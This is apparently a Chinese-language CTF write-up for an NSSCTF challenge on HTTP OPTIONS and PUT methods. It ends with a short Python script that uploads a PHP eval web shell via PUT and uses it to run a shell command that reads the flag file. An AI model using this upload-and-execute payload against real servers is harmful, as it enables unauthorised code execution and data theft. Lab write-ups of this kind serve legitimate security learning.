+++
title = '[NSSRound#1 Basic]basic_check'
date = '2023-09-06T15:34:16+08:00'
categories = ['刷题', '学习']
tags = ['http']
+++

## 打开题目

发现只有一行显示页面代码，通过扫描目录并没有有用的信息。

```
 <?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun.
```

## 考察点

这道题目考查http中的put请求，通过curl -i -X OPTIONS <http://node4.anna.nssctf.cn:28936/index.php，可以看到allow头部>

curl 参数-X 指定命令。这里用了一个 http OPTINOS，options也算一个http请求，

## http options

HTTP 的 `OPTIONS` 方法 用于获取目的资源所支持的通信选项。客户端可以对特定的 URL 使用 `OPTIONS` 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。

作用：

1. 检测服务器所支持的请求方法
2. CORS 中的预检请求(preflight request)

## Allow头部

`Allow` 首部字段用于枚举资源所支持的 HTTP 方法的集合。

![image-20230906205456828](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309062054895.png)

这里可以看到允许put方法，

## put请求

![image-20230906205543185](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309062055215.png)

可以看到如果没有找到请求的资源，会自动创建一个新资源，也就是我们可以自己上传文件到服务器，随便打。

```
import requests

myurl='http://node4.anna.nssctf.cn:28257/eval.php'
mypayload="<?php eval($_GET['a']);?>"
re=requests.put(url=myurl,data=mypayload)
mypayload2="a=system('cat /f*');"
re2=requests.get(url=myurl,params=mypayload2)
print(re2.text)
```
